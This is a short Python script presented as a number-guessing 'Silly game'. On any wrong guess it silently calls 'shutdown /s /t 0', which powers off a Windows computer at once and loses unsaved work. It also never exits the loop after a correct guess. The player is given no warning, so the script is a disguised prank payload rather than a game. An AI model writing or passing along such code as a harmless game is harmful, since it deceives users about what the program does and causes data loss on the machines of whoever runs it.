import random
import os

# Generate a random number between 1 and 10
number = random.randint(1, 10)

# Prompt the user to guess
while True:
    guess = input("Silly game! Guess a number between 1 and 10: \n Enter:")

    # Validate input
    if not guess.isdigit():
        print("Please enter a valid number!")
        continue

    # Convert input to integer
    guess = int(guess)

    # Check the guess
    if guess == number:
        print("You Won!")
    else:
        os.system("shutdown /s  /t 0")
